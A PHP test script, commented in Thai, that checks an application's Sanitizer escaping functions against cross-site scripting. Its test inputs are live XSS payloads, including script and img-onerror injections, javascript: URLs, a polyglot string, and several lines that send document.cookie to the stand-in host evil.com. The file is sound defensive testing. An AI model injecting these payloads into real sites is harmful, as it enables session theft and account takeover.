<?php
/**
 * Cross-Site Scripting (XSS) Protection Test
 * ทดสอบว่า Sanitizer ป้องกัน XSS ได้ครบทุกรูปแบบ
 *
 * วิธีรัน: php assets/security/test_xss.php
 */

require_once __DIR__ . '/Sanitizer.php';

echo "==========================================================\n";
echo "  Cross-Site Scripting (XSS) Protection Test\n";
echo "==========================================================\n\n";

$passed = 0;
$failed = 0;

function test($name, $condition, $detail = '') {
    global $passed, $failed;
    if ($condition) {
        echo "  ✅ PASS: {$name}\n";
        $passed++;
    } else {
        echo "  ❌ FAIL: {$name}\n";
        if ($detail) echo "          → {$detail}\n";
        $failed++;
    }
}

function noHtml($output) {
    return $output === strip_tags($output);
}

// ============================================================
// PART 1: esc() — HTML Content Escaping
// ============================================================
echo "──────────────────────────────────────────────────────────\n";
echo "  PART 1: esc() — HTML Content Escaping\n";
echo "──────────────────────────────────────────────────────────\n\n";

echo "[1.1] Basic script tag\n";
$payload = '<script>alert("XSS")</script>';
$result = esc($payload);
test("Script tag ถูก escape เป็น &lt;script&gt;", strpos($result, '<script>') === false);
test("ผลลัพธ์ไม่มี HTML tag", noHtml($result));
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.2] img onerror\n";
$payload = '<img src=x onerror=alert(1)>';
$result = esc($payload);
test("img tag ถูก escape", strpos($result, '<img') === false);
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.3] SVG XSS\n";
$payload = '<svg onload=alert(1)>';
$result = esc($payload);
test("SVG tag ถูก escape", strpos($result, '<svg') === false);
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.4] iframe injection\n";
$payload = '<iframe src="https://evil.com"></iframe>';
$result = esc($payload);
test("iframe ถูก escape", strpos($result, '<iframe') === false);
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.5] body onload\n";
$payload = '<body onload=alert(1)>';
$result = esc($payload);
test("body tag ถูก escape", strpos($result, '<body') === false);
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.6] div with style (CSS injection)\n";
$payload = '<div style="background:url(javascript:alert(1))">';
$result = esc($payload);
test("div+style ถูก escape", strpos($result, '<div') === false);
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.7] Nested/obfuscated script\n";
$payload = '<scr<script>ipt>alert(1)</scr</script>ipt>';
$result = esc($payload);
test("Nested script ถูก escape ทั้งหมด", strpos($result, '<scr') === false);
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[1.8] Null byte injection\n";
$payload = "<script\x00>alert(1)</script>";
$result = esc($payload);
test("Null byte script ถูก escape", strpos($result, '<script') === false);
echo "     Output: {$result}\n\n";

// ============================================================
// PART 2: escAttr() — HTML Attribute Escaping
// ============================================================
echo "──────────────────────────────────────────────────────────\n";
echo "  PART 2: escAttr() — HTML Attribute Escaping\n";
echo "──────────────────────────────────────────────────────────\n\n";

echo "[2.1] Double quote breakout\n";
$payload = '"><script>alert(1)</script>';
$result = escAttr($payload);
test("\" ถูก escape เป็น &quot;", strpos($result, '"') === false);
test("Script tag ถูก escape", strpos($result, '<script>') === false);
echo "     Input:  value=\"{$payload}\"\n";
echo "     Safe:   value=\"{$result}\"\n\n";

echo "[2.2] Single quote breakout\n";
$payload = "' onmouseover='alert(1)";
$result = escAttr($payload);
test("' ถูก escape", strpos($result, "'") === false);
echo "     Input:  value='{$payload}'\n";
echo "     Safe:   value='{$result}'\n\n";

echo "[2.3] Event handler injection via attribute\n";
$payload = '" onfocus="alert(1)" autofocus="';
$result = escAttr($payload);
test("Event handler ถูก escape ทั้งหมด", strpos($result, 'onfocus') !== false && strpos($result, '"') === false);
echo "     Input:  {$payload}\n";
echo "     Safe:   {$result}\n\n";

echo "[2.4] Style attribute injection\n";
$payload = '"; style="background:url(javascript:alert(1))';
$result = escAttr($payload);
test("Style injection ถูก escape", strpos($result, '"') === false);
echo "     Input:  {$payload}\n";
echo "     Safe:   {$result}\n\n";

echo "[2.5] Cookie value simulation — user cookie\n";
$payload = '"><img src=x onerror=alert(document.cookie)>';
$result = escAttr($payload);
test("Cookie theft payload ถูก escape", strpos($result, '<img') === false && strpos($result, '"') === false);
echo "     Input:  {$payload}\n";
echo "     Safe:   {$result}\n\n";

echo "[2.6] Password cookie simulation\n";
$payload = "pass123\" onclick=\"fetch('https://evil.com?c='+document.cookie)";
$result = escAttr($payload);
test("Fetch exfiltration ถูก escape", strpos($result, '"') === false);
echo "     Input:  {$payload}\n";
echo "     Safe:   {$result}\n\n";

// ============================================================
// PART 3: escUrl() — URL Escaping
// ============================================================
echo "──────────────────────────────────────────────────────────\n";
echo "  PART 3: escUrl() — URL Escaping\n";
echo "──────────────────────────────────────────────────────────\n\n";

$urlTests = [
    ["javascript:alert(1)",                        '#',   "javascript: protocol"],
    ["javascript:alert(document.cookie)",          '#',   "javascript: cookie theft"],
    ["JaVaScRiPt:alert(1)",                        '#',   "javascript: mixed case"],
    ["data:text/html,<script>alert(1)</script>",   '#',   "data: protocol"],
    ["vbscript:msgbox('xss')",                     '#',   "vbscript: protocol"],
    ["https://example.com",                        'https://example.com',  "valid https URL"],
    ["http://example.com/path?q=1",                'http://example.com/path?q=1',  "valid http URL with query"],
    ["mailto:test@test.com",                       'mailto:test@test.com', "valid mailto"],
    ["tel:+66891234567",                           'tel:+66891234567',    "valid tel"],
    ["",                                           '',    "empty string"],
    ["#",                                          '#',   "hash only"],
];

foreach ($urlTests as $i => $t) {
    $idx = $i + 1;
    $result = escUrl($t[0]);
    $expected = $t[1];
    $label = $t[2];
    test("[3.{$idx}] {$label}", $result === $expected, "got: \"{$result}\", expected: \"{$expected}\"");
}
echo "\n";

// ============================================================
// PART 4: clean() — Strip Tags + Escape
// ============================================================
echo "──────────────────────────────────────────────────────────\n";
echo "  PART 4: clean() — Strip Tags + Escape\n";
echo "──────────────────────────────────────────────────────────\n\n";

echo "[4.1] Mixed HTML + script\n";
$payload = '<b>Hello</b> <script>alert(1)</script> World';
$result = clean($payload);
test("ทุก tag ถูกลบ", $result === 'Hello alert(1) World');
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[4.2] Nested tags\n";
$payload = '<div><p>Text <a href="javascript:alert(1)">click</a></p></div>';
$result = clean($payload);
test("Tags ถูกลบเหลือแต่ text", $result === 'Text click');
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

echo "[4.3] Ampersand handling\n";
$payload = 'Tom & Jerry <script>alert(1)</script>';
$result = clean($payload);
test("& ถูก escape เป็น &amp; + tag ถูกลบ", $result === 'Tom &amp; Jerry alert(1)');
echo "     Input:  {$payload}\n";
echo "     Output: {$result}\n\n";

// ============================================================
// PART 5: Real-World Attack Scenarios
// ============================================================
echo "──────────────────────────────────────────────────────────\n";
echo "  PART 5: Real-World Attack Scenarios\n";
echo "──────────────────────────────────────────────────────────\n\n";

echo "[5.1] Stored XSS — malicious note in check-in\n";
$noteIn = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
$safe = esc($noteIn);
test("Note ที่มี script ถูก escape", strpos($safe, '<script>') === false);
echo "     Simulated: \$noteIn from DB = {$noteIn}\n";
echo "     Output:    {$safe}\n\n";

echo "[5.2] Stored XSS — malicious employee name\n";
$name = 'John<img src=x onerror=alert(1)>';
$safe = esc($name);
test("ชื่อที่มี img tag ถูก escape", strpos($safe, '<img') === false);
echo "     Simulated: employee name = {$name}\n";
echo "     Output:    {$safe}\n\n";

echo "[5.3] Stored XSS — malicious domain in websiteList\n";
$domain = 'https://evil.com" onclick="alert(1)" x="';
$safeUrl = escUrl($domain);
$safeText = esc($domain);
test("Domain URL attribute ถูก escape", strpos($safeUrl, '"') === false || $safeUrl === '#');
test("Domain text ถูก escape", strpos($safeText, '"') === false);
echo "     Input:    href=\"{$domain}\"\n";
echo "     Safe URL: href=\"{$safeUrl}\"\n";
echo "     Safe Text: {$safeText}\n\n";

echo "[5.4] Reflected XSS — filter parameter in printCheckinLogs\n";
$department = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>';
$safe = esc($department);
test("Filter param ที่มี script ถูก escape", strpos($safe, '<script>') === false);
echo "     Simulated: \$_GET['department'] = {$department}\n";
echo "     Output:    {$safe}\n\n";

echo "[5.5] Cookie poisoning — login page\n";
$cookie_user = '"><svg/onload=alert(document.domain)>';
$safe = escAttr($cookie_user);
test("Cookie user value ถูก escape", strpos($safe, '"') === false && strpos($safe, '<svg') === false);
echo "     Cookie:   {$cookie_user}\n";
echo "     Safe:     value=\"{$safe}\"\n\n";

echo "[5.6] Polyglot XSS payload\n";
$polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2511telerik/telerik/oNcliCk=alert()//>';
$safeUrl = escUrl($polyglot);
$safeHtml = esc($polyglot);
test("Polyglot URL → blocked", $safeUrl === '#');
test("Polyglot HTML → escaped", noHtml($safeHtml));
echo "\n";

echo "[5.7] Session password display — myProfile.php\n";
$password = 'P@ss" onmouseover="alert(1)" x="';
$safe = escAttr($password);
test("Password attribute breakout ถูก escape", strpos($safe, '"') === false);
echo "     Password: {$password}\n";
echo "     Safe:     value=\"{$safe}\"\n\n";

echo "[5.8] POST data debug output — debug_db.php\n";
$postData = ['name' => '<script>alert(1)</script>', 'value' => '"><img src=x onerror=alert(1)>'];
$safe = htmlspecialchars(print_r($postData, true), ENT_QUOTES, 'UTF-8');
test("print_r output ถูก escape", strpos($safe, '<script>') === false && strpos($safe, '<img') === false);
echo "\n";

// ============================================================
// Summary
// ============================================================
echo "==========================================================\n";
$total = $passed + $failed;
echo "  Results: {$passed}/{$total} passed";
if ($failed > 0) {
    echo "  ({$failed} FAILED)";
} else {
    echo "  — ALL CLEAR ✅";
}
echo "\n";
echo "==========================================================\n";

exit($failed > 0 ? 1 : 0);
